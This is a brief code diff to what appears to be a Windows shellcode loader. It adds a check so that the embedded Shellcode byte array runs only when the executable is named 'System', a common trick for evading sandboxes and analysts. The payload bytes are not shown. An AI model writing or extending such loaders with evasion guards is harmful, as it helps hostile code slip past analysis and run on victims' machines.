@@ -42,5 +42,11 @@ __declspec(allocate(".text")) BYTE Shellcode[] = {
 
 int _tmain(int argc, TCHAR* argv[])
 {
+	TCHAR FileName[MAX_PATH];
+	_tsplitpath_s(argv[0], NULL, 0, NULL, 0, FileName, sizeof(FileName), NULL, 0);
+
+	if (_tcsicmp(FileName, _T("System")) != 0)
+		return 0;
+
 	return (*(int(*)())(&Shellcode[0x0]))();
 }
